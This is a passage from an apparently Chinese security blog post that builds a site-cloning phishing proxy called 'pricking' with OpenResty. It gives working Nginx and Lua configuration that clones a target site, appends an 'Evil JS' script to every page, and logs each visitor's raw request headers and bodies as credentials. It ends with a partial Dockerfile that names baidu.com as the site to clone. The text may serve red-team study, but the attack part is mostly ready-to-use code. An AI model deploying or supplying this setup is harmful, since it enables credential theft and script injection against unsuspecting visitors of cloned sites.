+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>worker_processes  1;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>error_log  logs/error.log error;    # 日志级别
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>events {
+</span></span><span style=display:flex><span>    worker_connections  1024;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>http {
+</span></span><span style=display:flex><span>    server {
+</span></span><span style=display:flex><span>        listen    80;
+</span></span><span style=display:flex><span>        server_name example-1.com;
+</span></span><span style=display:flex><span>        location / {
+</span></span><span style=display:flex><span>            proxy_pass http://www.example.com/link/;
+</span></span><span style=display:flex><span>            proxt_set_header Host www.example.com;
+</span></span><span style=display:flex><span>            proxt_set_header Referer http://www.example.com/link/;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></td></tr></table></div></div><p>至此，就能完美克隆目标网站了。</p><h3 id=注入模块化的evil-js>注入模块化的Evil JS</h3><p>使用<code>body_filter_by_lua_block</code>可以对网站内容进行修改，利用好这个功能，就能将JS文件引入到页面中。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>header_filter_by_lua_block { ngx.header.content_length = nil}
+</span></span><span style=display:flex><span>                body_filter_by_lua_block{
+</span></span><span style=display:flex><span>                        local chunk, eof = ngx.arg[1], ngx.arg[2]
+</span></span><span style=display:flex><span>                        local buffered = ngx.ctx.buffered
+</span></span><span style=display:flex><span>                        if not buffered then
+</span></span><span style=display:flex><span>                           buffered = {}
+</span></span><span style=display:flex><span>                           ngx.ctx.buffered = buffered
+</span></span><span style=display:flex><span>                        end
+</span></span><span style=display:flex><span>                        if chunk ~= &#34;&#34; then
+</span></span><span style=display:flex><span>                           buffered[#buffered + 1] = chunk
+</span></span><span style=display:flex><span>                           ngx.arg[1] = nil
+</span></span><span style=display:flex><span>                        end
+</span></span><span style=display:flex><span>                        if eof then
+</span></span><span style=display:flex><span>                           local whole = table.concat(buffered)
+</span></span><span style=display:flex><span>                           ngx.ctx.buffered = nil
+</span></span><span style=display:flex><span>                           whole = whole .. &#34;&lt;script src=&#39;/7276df76835ed2272cc0e59f55e49902/static.js&#39; type=&#39;module&#39;&gt;&lt;/script&gt;&#34;
+</span></span><span style=display:flex><span>                           ngx.arg[1] = whole
+</span></span><span style=display:flex><span>                        end
+</span></span><span style=display:flex><span>                }
+</span></span></code></pre></td></tr></table></div></div><p>在修改网页内容之前，需要通过<code>header_filter_by_lua_block</code>将<code>Content-Length</code>进行清空，因为修改后，<code>Content-Length</code>的大小一定是改变的。</p><h3 id=使用es6标准将js模块化>使用ES6+标准将JS模块化</h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;/7276df76835ed2272cc0e59f55e49902/static.js&#39;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;module&#39;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
+</span></span></code></pre></td></tr></table></div></div><p>其中<code>static.js</code>就是引入的Evil JS，添加了<code>type='module'</code>是为了启用<a href=https://www.freecodecamp.org/news/learn-modern-javascript/>ES6+</a>标准。</p><p><img src=https://images.payloads.online/b087b05c-4f5f-11ec-8b14-00d861bf4abb.png alt=2021-02-16-17-10-54></p><p>为了不和源站的目录冲突，<code>7276df76835ed2272cc0e59f55e49902</code>其实是一个虚拟的目录，通过<code>location</code>映射即可。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>location ^~ /7276df76835ed2272cc0e59f55e49902/ {
+</span></span><span style=display:flex><span>                alias    /tmp/pricking/static/;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></td></tr></table></div></div><p>关于Import的说明可以看<a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import>这篇文章</a>。</p><p>使用模块化功能可以让这个项目吸收更多关于浏览器丰富的操作，就像XSS平台那样。</p><h3 id=nginx---记录日志或凭证>Nginx - 记录日志或凭证</h3><p>由于<code>log_by_lua_block</code>是最后一个流程，可以把一些数据进行收集，写入日志文件。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>http {
+</span></span><span style=display:flex><span>    <span style=color:#f92672>....</span>
+</span></span><span style=display:flex><span>    log_format  logeverything  <span style=color:#e6db74>&#39;$current_time - $remote_addr </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>$request_headers </span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>$request_body</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    server {
+</span></span><span style=display:flex><span>            set <span style=color:#f92672>$</span>request_headers <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>            set <span style=color:#f92672>$</span>current_time <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>           <span style=color:#f92672>....</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            location <span style=color:#f92672>/</span> {
+</span></span><span style=display:flex><span>                <span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span>                log_by_lua_block {
+</span></span><span style=display:flex><span>                    ngx<span style=color:#f92672>.</span><span style=color:#66d9ef>var</span><span style=color:#f92672>.</span>current_time <span style=color:#f92672>=</span> ngx<span style=color:#f92672>.</span>localtime()                  
+</span></span><span style=display:flex><span>                    ngx<span style=color:#f92672>.</span><span style=color:#66d9ef>var</span><span style=color:#f92672>.</span>request_headers <span style=color:#f92672>=</span> ngx<span style=color:#f92672>.</span>req<span style=color:#f92672>.</span>raw_header()
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        access_log <span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>pricking<span style=color:#f92672>/</span>access<span style=color:#f92672>.</span>log logeverything;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></td></tr></table></div></div><p><code>ngx.localtime()</code>和<code>ngx.req.raw_header()</code>是调用了<a href=https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/>Lua Ngx API</a>。</p><h3 id=nginx---最终配置>Nginx - 最终配置</h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>worker_processes  <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>events {
+</span></span><span style=display:flex><span>    worker_connections  <span style=color:#ae81ff>1024</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>http {
+</span></span><span style=display:flex><span>    include       mime<span style=color:#f92672>.</span>types;
+</span></span><span style=display:flex><span>    default_type  application<span style=color:#f92672>/</span>octet<span style=color:#f92672>-</span>stream;
+</span></span><span style=display:flex><span>    sendfile        on;
+</span></span><span style=display:flex><span>    log_format  logeverything  <span style=color:#e6db74>&#39;$current_time - $remote_addr </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>$request_headers </span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>$request_body</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    server {
+</span></span><span style=display:flex><span>            set <span style=color:#f92672>$</span>request_headers <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>            set <span style=color:#f92672>$</span>current_time <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            server_name proxy<span style=color:#f92672>.</span>payloads<span style=color:#f92672>.</span>online;
+</span></span><span style=display:flex><span>            listen <span style=color:#ae81ff>80</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            location <span style=color:#f92672>^~</span> <span style=color:#f92672>/</span><span style=color:#ae81ff>7276</span>df76835ed2272cc0e59f55e49902<span style=color:#f92672>/</span> {
+</span></span><span style=display:flex><span>                alias    <span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>pricking<span style=color:#f92672>/</span><span style=color:#66d9ef>static</span><span style=color:#f92672>/</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            location <span style=color:#f92672>/</span> {
+</span></span><span style=display:flex><span>                proxy_pass http:<span style=color:#f92672>//</span>payloads<span style=color:#f92672>.</span>online;
+</span></span><span style=display:flex><span>                proxy_set_header Host payloads<span style=color:#f92672>.</span>online;
+</span></span><span style=display:flex><span>                header_filter_by_lua_block { ngx<span style=color:#f92672>.</span>header<span style=color:#f92672>.</span>content_length <span style=color:#f92672>=</span> nil}
+</span></span><span style=display:flex><span>                body_filter_by_lua_block{
+</span></span><span style=display:flex><span>                        local chunk, eof <span style=color:#f92672>=</span> ngx<span style=color:#f92672>.</span>arg[<span style=color:#ae81ff>1</span>], ngx<span style=color:#f92672>.</span>arg[<span style=color:#ae81ff>2</span>]
+</span></span><span style=display:flex><span>                        local buffered <span style=color:#f92672>=</span> ngx<span style=color:#f92672>.</span>ctx<span style=color:#f92672>.</span>buffered
+</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> buffered then
+</span></span><span style=display:flex><span>                           buffered <span style=color:#f92672>=</span> {}
+</span></span><span style=display:flex><span>                           ngx<span style=color:#f92672>.</span>ctx<span style=color:#f92672>.</span>buffered <span style=color:#f92672>=</span> buffered
+</span></span><span style=display:flex><span>                        end
+</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> chunk <span style=color:#f92672>~=</span> <span style=color:#e6db74>&#34;&#34;</span> then
+</span></span><span style=display:flex><span>                           buffered[<span style=color:#75715e>#buffered + 1] = chunk</span>
+</span></span><span style=display:flex><span>                           ngx<span style=color:#f92672>.</span>arg[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> nil
+</span></span><span style=display:flex><span>                        end
+</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> eof then
+</span></span><span style=display:flex><span>                           local whole <span style=color:#f92672>=</span> table<span style=color:#f92672>.</span>concat(buffered)
+</span></span><span style=display:flex><span>                           ngx<span style=color:#f92672>.</span>ctx<span style=color:#f92672>.</span>buffered <span style=color:#f92672>=</span> nil
+</span></span><span style=display:flex><span>                           whole <span style=color:#f92672>=</span> whole <span style=color:#f92672>..</span> <span style=color:#e6db74>&#34;&lt;script src=&#39;/7276df76835ed2272cc0e59f55e49902/static.js&#39; type=&#39;module&#39;&gt;&lt;/script&gt;&#34;</span>
+</span></span><span style=display:flex><span>                           ngx<span style=color:#f92672>.</span>arg[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> whole
+</span></span><span style=display:flex><span>                        end
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                log_by_lua_block {
+</span></span><span style=display:flex><span>                    ngx<span style=color:#f92672>.</span><span style=color:#66d9ef>var</span><span style=color:#f92672>.</span>current_time <span style=color:#f92672>=</span> ngx<span style=color:#f92672>.</span>localtime()                  
+</span></span><span style=display:flex><span>                    ngx<span style=color:#f92672>.</span><span style=color:#66d9ef>var</span><span style=color:#f92672>.</span>request_headers <span style=color:#f92672>=</span> ngx<span style=color:#f92672>.</span>req<span style=color:#f92672>.</span>raw_header()
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        access_log <span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>pricking<span style=color:#f92672>/</span>access<span style=color:#f92672>.</span>log logeverything;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></td></tr></table></div></div><h3 id=nginx---dockerfile编写>Nginx - Dockerfile编写</h3><p>Dockerfile :</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>FROM openresty/openresty:alpine
+</span></span><span style=display:flex><span>ENV PROXY_PASS_HOST www.baidu-proxy.com # 自己的域名
+</span></span><span style=display:flex><span>ENV PROXY_SOURCE_HOST www.baidu.com # 要克隆的域名
+</span></span><span style=display:flex><span>ENV NGINX_LISTEN_PORT 80 # 监听端口，不建议改动
+</span></span><span style=display:flex><span>ENV EVIL_JS_URI b026324c6904b2a9cb4b88d6d61c81d1 # JS虚拟目录名称
+</span></span><span style=display:flex><span>WORKDIR /tmp/
